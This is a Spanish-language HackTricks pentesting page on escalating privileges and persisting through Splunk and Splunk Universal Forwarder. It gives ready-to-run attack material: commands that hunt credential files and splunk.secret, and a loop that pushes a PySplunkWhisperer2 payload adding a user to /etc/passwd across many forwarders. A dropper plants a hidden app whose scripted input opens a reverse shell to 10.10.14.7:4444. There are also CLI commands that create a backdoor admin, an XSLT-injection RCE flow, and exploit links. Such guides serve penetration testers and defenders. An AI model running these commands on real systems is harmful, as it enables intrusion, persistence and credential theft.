# LPE y Persistence en Splunk

{{#include ../../banners/hacktricks-training.md}}

Si al **enumerar** una máquina **internamente** o **externamente** encuentras **Splunk en ejecución** (normalmente **8000** para la interfaz web y **8089** para la API de gestión), las credenciales válidas a menudo pueden convertirse en **ejecución de código** mediante la instalación de apps, scripted inputs o acciones de gestión.<sup>[[1]](#references)[[5]](#references)[[6]](#references)[[10]](#references)</sup> Si Splunk se ejecuta como **root**, esto suele convertirse inmediatamente en una **escalada de privilegios**.<sup>[[1]](#references)</sup>

Si solo necesitas la superficie de ataque remota genérica, la enumeración o la ruta de RCE mediante subida de apps, consulta:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

Si **ya eres root** y el servicio de Splunk no está escuchando únicamente en localhost, también puedes robar **hashes de contraseñas de Splunk**, recuperar **secretos cifrados** o subir una **app maliciosa** para mantener la persistencia localmente o en múltiples forwarders.<sup>[[7]](#references)[[8]](#references)[[11]](#references)</sup>

## Archivos locales interesantes

Cuando accedes a un host que ejecuta Splunk o Splunk Universal Forwarder, estas suelen ser las rutas más interesantes:<sup>[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
Artefactos importantes:

- **`$SPLUNK_HOME/etc/passwd`**: usuarios locales de Splunk y hashes de contraseñas.<sup>[[7]](#references)</sup>
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: clave utilizada por Splunk para cifrar secretos almacenados en varios archivos `.conf`.<sup>[[8]](#references)</sup>
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: archivo de bootstrap del administrador inicial; útil en gold images y errores de provisioning. Se ignora si `etc/passwd` ya existe.<sup>[[9]](#references)</sup>
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: ubicación donde suelen habilitarse los scripted inputs.<sup>[[10]](#references)</sup>
- **`$SPLUNK_HOME/etc/deployment-apps/`** o **`$SPLUNK_HOME/etc/apps/`**: buenos lugares para ocultar una app persistente o revisar qué se está distribuyendo.<sup>[[11]](#references)</sup>

## Resumen del exploit del agente Splunk Universal Forwarder

Para obtener más detalles, consulta [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Esto es solo un resumen.<sup>[[1]](#references)</sup>

**Resumen del exploit:**
Un exploit dirigido a Splunk Universal Forwarder (UF) permite a atacantes que tienen la **contraseña del agente** ejecutar código arbitrario en los sistemas donde se ejecuta el agente, comprometiendo potencialmente una gran parte del entorno.<sup>[[1]](#references)</sup>

**Por qué funciona:**

- El servicio de gestión del UF suele estar expuesto en **TCP 8089**.<sup>[[6]](#references)</sup>
- Los atacantes pueden autenticarse en la API e indicar al forwarder que instale un **malicious app bundle**.<sup>[[1]](#references)[[5]](#references)</sup>
- La misma primitiva puede utilizarse localmente para **LPE** o remotamente para **RCE**.<sup>[[5]](#references)</sup>
- Herramientas públicas como **SplunkWhisperer2** crean automáticamente el app bundle y pueden adaptar los payloads para objetivos Linux.<sup>[[5]](#references)</sup>

**Formas habituales de recuperar la contraseña:**

- Credenciales en texto claro en documentación, scripts, shares o automatización de deployment.<sup>[[1]](#references)</sup>
- Hashes de contraseñas dentro de `$SPLUNK_HOME/etc/passwd`, seguidos de cracking offline.<sup>[[1]](#references)[[7]](#references)</sup>
- Golden images o restos de provisioning, como `user-seed.conf`.<sup>[[1]](#references)[[9]](#references)</sup>

**Impacto:**

- Ejecución de código con nivel SYSTEM/root en cada host comprometido.<sup>[[1]](#references)</sup>
- Deployment de apps persistentes, backdoors o ransomware.<sup>[[1]](#references)</sup>
- Deshabilitación o manipulación de la telemetría antes de reenviar los datos.<sup>[[1]](#references)</sup>

**Comando de ejemplo para la explotación:**

El informe original muestra el siguiente bucle para enviar un payload a múltiples forwarders.<sup>[[1]](#references)</sup>
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Exploits públicos utilizables:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Persistencia mediante Scripted Inputs o aplicaciones maliciosas

Si tienes **acceso de escritura al sistema de archivos** como `root`/`splunk`, o acceso autenticado para instalar aplicaciones, un mecanismo de persistencia muy fiable consiste en colocar una **aplicación personalizada** con un **scripted input**.<sup>[[2]](#references)[[5]](#references)[[10]](#references)</sup> La documentación de Splunk indica que los scripted inputs deben residir en el directorio de una aplicación y habilitarse desde `inputs.conf`.<sup>[[10]](#references)</sup>

Diseño típico:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
`inputs.conf` mínimo:<sup>[[10]](#references)</sup>
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
Dropper rápido de Linux (usando ese diseño de app documentado):<sup>[[10]](#references)</sup>
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
Notas:

- El mismo truco funciona en **Universal Forwarder** usando `/opt/splunkforwarder/etc/apps/`.<sup>[[2]](#references)[[10]](#references)</sup>
- Los atacantes suelen pasar desapercibidos modificando un add-on legítimo en lugar de crear una app obviamente maliciosa.<sup>[[2]](#references)</sup>
- En un **deployment server**, colocar una app maliciosa dentro de `deployment-apps/` se convierte en **persistence para toda la flota**, porque los forwarders consultan, descargan apps actualizadas y a menudo se reinician para aplicarlas.<sup>[[11]](#references)[[12]](#references)</sup>

## Robo de Credenciales y Toma de Control de Admin

Si puedes leer los archivos locales de Splunk, normalmente hay dos objetivos importantes: recuperar el **acceso de admin de Splunk** y recuperar las **service credentials cifradas**.<sup>[[8]](#references)</sup>

### Hashes de contraseñas y usuarios locales

Splunk almacena los datos de autenticación local en `etc/passwd`. Dependiendo del deployment, crackear ese archivo puede permitir recuperar credenciales válidas para la UI web y la API de management.<sup>[[1]](#references)[[7]](#references)</sup>

Si ya tienes credenciales válidas de **admin** y Splunk utiliza su backend de autenticación **native**, la propia CLI puede utilizarse para persistence.<sup>[[13]](#references)</sup>
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` y valores cifrados

Splunk utiliza `etc/auth/splunk.secret` para proteger valores sensibles almacenados en varios archivos de configuración. Si puedes robar tanto el **secret** como los archivos **`.conf`** relevantes, a menudo puedes recuperar o reutilizar:<sup>[[8]](#references)</sup>

- secretos compartidos de forwarder/indexer, como `pass4SymmKey`
- contraseñas de claves privadas TLS, como `sslPassword`
- credenciales de enlace LDAP, como `bindDNPassword`

Esto puede facilitar el **movimiento lateral** incluso cuando la contraseña del administrador de Splunk no se puede crackear.<sup>[[8]](#references)</sup>

### Abuso de `user-seed.conf`

`user-seed.conf` solo se utiliza durante el primer inicio o cuando `etc/passwd` no existe. Esto lo hace menos útil en un sistema activo, pero muy interesante en:<sup>[[9]](#references)</sup>

- plantillas de instalación comprometidas
- imágenes de contenedores
- flujos de aprovisionamiento desatendidos
- appliances en los que Splunk se reinicializa automáticamente

En esos casos, colocar un `HASHED_PASSWORD` generado con `splunk hash-passwd` te proporciona una forma discreta de recuperar el acceso de administrador después del redeployment.<sup>[[9]](#references)</sup>

## Abuso de consultas de Splunk

Para más detalles, consulta [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis).<sup>[[3]](#references)[[4]](#references)</sup>

Una técnica reciente útil consiste en abusar de **XSLT proporcionado por el usuario** en versiones vulnerables de Splunk Enterprise para convertir una cuenta autenticada con pocos privilegios en **ejecución de comandos del sistema operativo** como el usuario `splunk`.<sup>[[3]](#references)[[4]](#references)</sup>

Flujo de alto nivel:<sup>[[3]](#references)[[4]](#references)</sup>

1. Autenticarse en Splunk.
2. Subir un archivo **XSL** malicioso mediante la funcionalidad de preview/upload.
3. Hacer que Splunk renderice los resultados de búsqueda con esa stylesheet subida desde el directorio **dispatch**.
4. Utilizar el payload XSLT para escribir un archivo o activar la ejecución mediante el search pipeline de Splunk, por ejemplo, accediendo a funcionalidades internas como `runshellscript`.

La conclusión ofensiva importante es que esta vía permite **RCE post-auth sin necesitar app upload**. En Linux normalmente terminas en la cuenta **`splunk`**, que sigue siendo valiosa porque a menudo es propietaria del árbol de la aplicación, puede leer secretos y puede colocar apps persistentes que sobreviven a la pérdida del shell.<sup>[[3]](#references)[[4]](#references)</sup>

Una ruta representativa utilizada durante la explotación es:<sup>[[4]](#references)</sup>
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
Si Splunk se está ejecutando con demasiados privilegios, o si el usuario `splunk` tiene acceso a scripts peligrosos, unidades de servicio modificables o reglas de `sudo` inseguras, esto se convierte en una cadena limpia de **LPE**.

## References

- [1] [Abusar de Splunk Forwarders para RCE y Persistence](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [Cuidado con TraitorWare: usar Splunk para Persistence](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Aviso de seguridad de Splunk SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [Análisis de CVE-2023-46214: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)
- [5] [SplunkWhisperer2/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [6] [Cambiar los valores predeterminados](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.2/start-splunk-enterprise-and-perform-initial-tasks/change-default-values)
- [7] [authentication.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/10.4/configuration-file-reference/10.4.0-configuration-file-reference/authentication.conf)
- [8] [Implementar contraseñas seguras en varios servidores](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/10.4/install-splunk-enterprise-securely/deploy-secure-passwords-across-multiple-servers)
- [9] [user-seed.conf](https://help.splunk.com/en/splunk-enterprise/administer/admin-manual/9.2/configuration-file-reference/9.2.6-configuration-file-reference/user-seed.conf)
- [10] [Configurar una scripted input](https://help.splunk.com/en/splunk-enterprise/developing-views-and-apps-for-splunk-web/10.0/build-scripted-inputs/setting-up-a-scripted-input)
- [11] [Crear deployment apps](https://help.splunk.com/splunk-enterprise/administer/update-your-deployment/9.4/configure-the-deployment-system/create-deployment-apps)
- [12] [Cómo se producen las actualizaciones de deployment](https://help.splunk.com/en/splunk-enterprise/administer/update-your-deployment/9.2/deployment-server-and-forwarder-management/how-deployment-updates-happen)
- [13] [Configurar usuarios con la CLI](https://help.splunk.com/en/splunk-enterprise/administer/manage-users-and-security/9.4/perform-advanced-user-and-role-management-in-splunk-enterprise/configure-users-with-the-cli)
{{#include ../../banners/hacktricks-training.md}}
